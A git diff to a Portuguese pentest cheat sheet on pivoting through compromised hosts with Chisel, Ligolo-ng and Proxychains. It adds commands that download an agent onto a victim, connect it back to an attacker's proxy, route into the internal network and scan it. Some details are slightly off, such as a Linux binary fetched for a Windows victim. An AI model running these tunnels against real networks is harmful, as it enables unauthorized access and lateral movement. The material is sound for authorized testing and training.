@@ -142,6 +142,24 @@ proxychains4 nmap -sV -Pn 10.0.0.0/24
 
 Tunneling via HTTP/HTTPS. Útil quando SSH está bloqueado.
 
+### 🎯 Quando usar o Chisel
+- SSH está bloqueado ou filtrado por firewall entre sua máquina e o target
+- Precisa criar um túnel SOCKS rápido para escanear e acessar uma rede interna
+- A vítima tem acesso à internet mas não permite conexões SSH de fora
+- Precisa de port forwarding específico (ex: redirecionar RDP ou SMB de uma rede interna)
+
+### 🛠️ Como o Chisel te ajuda
+- Encapsula tráfego TCP/UDP dentro de HTTP/HTTPS, atravessando firewalls que bloqueiam SSH
+- Cria um proxy SOCKS que qualquer ferramenta pode usar (nmap, hydra, smbclient)
+- Permite múltiplos túneis simultâneos em uma única conexão
+- Funciona em Windows e Linux — basta baixar o binário para a vítima
+
+### ➡️ Depois de usar o Chisel — Próximos passos
+1. Configure o proxychains para apontar para o SOCKS local (geralmente `socks5 127.0.0.1 1080`)
+2. Teste o túnel com `proxychains4 curl http://rede-interna` antes de escanear
+3. Execute enumeração completa da rede interna via proxychains (nmap, enum4linux-ng)
+4. Se precisar de port forwarding específico, crie túneis dedicados para cada serviço (RDP, SMB)
+
 ### Instalação
 ```bash
 # No atacante (.listener):
@@ -185,41 +203,94 @@ chisel client 192.168.1.100:8080 R:3389:10.0.0.5:3389 R:445:10.0.0.5:445
 
 ## Ligolo-ng
 
-Tunneling sem necessidade de SOCKS. Mais rápido que Chisel.
+Tunneling moderno sem necessidade de SOCKS — mais rápido que Chisel.
+
+### 🎯 Quando usar o Ligolo-ng
+- Precisa de pivoting para redes internas sem a sobrecarga de configurar SOCKS
+- Quer uma alternativa mais rápida e moderna ao Chisel para movimentação lateral
+- A vítima é Windows e você quer evitar configurar proxychains no sistema
+- Precisa de múltiplos túneis simultâneos com interface de gerenciamento interativa
+
+### 🛠️ Como o Ligolo-ng te ajuda
+- Cria rotas diretamente na interface de rede — não precisa configurar proxychains
+- Interface interativa permite gerenciar sessões e adicionar rotas em tempo real
+- Mais rápido que Chisel por não ter overhead de SOCKS
+- Suporta conexões reversas — a vítima inicia a conexão, útil quando atrás de NAT
+
+### ➡️ Depois de usar o Ligolo-ng — Próximos passos
+1. Verifique as interfaces da vítima com `ifconfig` no proxy para identificar redes acessíveis
+2. Adicione rotas para todas as redes internas descobertas antes de escanear
+3. Teste conectividade com ping ou curl para as redes internas
+4. Execute enumeração (nmap, enum4linux-ng) diretamente — sem precisar de proxychains
 
 ### Instalação
+
 ```bash
-# Download: https://github.com/nicocha30/ligolo-ng/releases
-# Baixar: proxy (para atacante) e agent (para vítima)
+# Download do proxy (ativo) e agent (vítima)
+# https://github.com/nicocha30/ligolo-ng/releases
+
+# No Kali (ativo):
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1/ligolo-ng_proxy_0.7.1_linux_amd64.tar.gz
+tar xzf ligolo-ng_proxy_*.tar.gz
+
+# Na vítima (Windows/Linux):
+wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1/ligolo-ng_agent_0.7.1_linux_amd64.tar.gz
 ```
 
-### Uso básico
+### Configuração — Atacante (Proxy)
 
-#### Atacante (Proxy)
 ```bash
-# Iniciar proxy
-sudo ./proxy -selfcert -laddr 0.0.0.0:11601
-
-# Criar interface tun
+# 1. Criar interface tun
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
+
+# 2. Iniciar proxy com certificado self-signed
+sudo ./proxy -selfcert -laddr 0.0.0.0:11601
+
+# OUTPUT ESPERADO:
+# INFO[0000] Starting proxy server... addr=0.0.0.0:11601
+# INFO[0000] Listening for connections...
 ```
 
-#### Vítima (Agent)
+### Configuração — Vítima (Agent)
+
 ```bash
-# Conectar no proxy
+# 1. Conectar no proxy do atacante
 ./agent -connect 192.168.1.100:11601 -ignore-cert
 
-# No proxy (interativo):
->> session
->> start
->> ifconfig
-# Obter IP da rede interna (ex: 10.0.0.5)
+# OUTPUT ESPERADO:
+# INFO[0000] Connecting to proxy 192.168.1.100:11601...
+# INFO[0001] Connected! Waiting for instructions...
+```
 
-# Adicionar rota
+### Configuração de roteamento (no Proxy interativo)
+
+```bash
+# No terminal do proxy, listar sessões ativas
+>> session
+
+# Selecionar sessão da vítima
+>> 1
+
+# Ver interfaces da vítima
+>> ifconfig
+
+# OUTPUT ESPERADO:
+# Name      IP             MAC
+# eth0      10.0.0.5       aa:bb:cc:dd:ee:ff  ← rede interna
+# eth1      192.168.1.50   11:22:33:44:55:66  ← rede externa
+
+# Adicionar rota para rede interna
 >> sudo ip route add 10.0.0.0/24 dev ligolo
 
 # Agora pode acessar 10.0.0.0/24 diretamente!
+nmap -sV 10.0.0.0/24
+# OUTPUT ESPERADO:
+# Nmap scan report for 10.0.0.5
+# PORT     STATE SERVICE VERSION
+# 22/tcp   open  ssh     OpenSSH 8.9
+# 80/tcp   open  http    Apache httpd 2.4.54
+# 445/tcp  open  smb     Samba 4.17
 ```
 
 ---
@@ -227,6 +298,24 @@ sudo ip link set ligolo up
 ## Proxychains
 
 Força qualquer aplicação a usar o túnel SOCKS.
+
+### 🎯 Quando usar o Proxychains
+- Você já tem um túnel SOCKS ativo (via SSH, Chisel ou Ligolo-ng) e precisa forçar ferramentas a usá-lo
+- Ferramentas como nmap, hydra e smbclient não suportam proxy SOCKS nativamente
+- Precisa fazer enumeração de rede interna através de um túnel já configurado
+- Quer que todo o tráfego de um comando passe pelo túnel sem modificar a ferramenta
+
+### 🛠️ Como o Proxychains te ajuda
+- Intercepts chamadas de rede de qualquer aplicação e redireciona pelo proxy SOCKS
+- Funciona com nmap, curl, ssh, hydra, smbclient — praticamente qualquer ferramenta de rede
+- Modo `dynamic_chain` permite múltiplos proxies em sequência para redundância
+- Não precisa modificar as ferramentas — basta adicionar `proxychains4` antes do comando
+
+### ➡️ Depois de usar o Proxychains — Próximos passos
+1. Verifique se o arquivo `/etc/proxychains4.conf` aponta para o proxy SOCKS correto
+2. Teste o túnel com um comando simples antes de escanear: `proxychains4 curl http://target`
+3. Se o nmap não funcionar, desabilite a resolução DNS no proxychains config
+4. Documente quais serviços da rede interna foram descobertos através do túnel
 
 ### Configuração
 ```bash
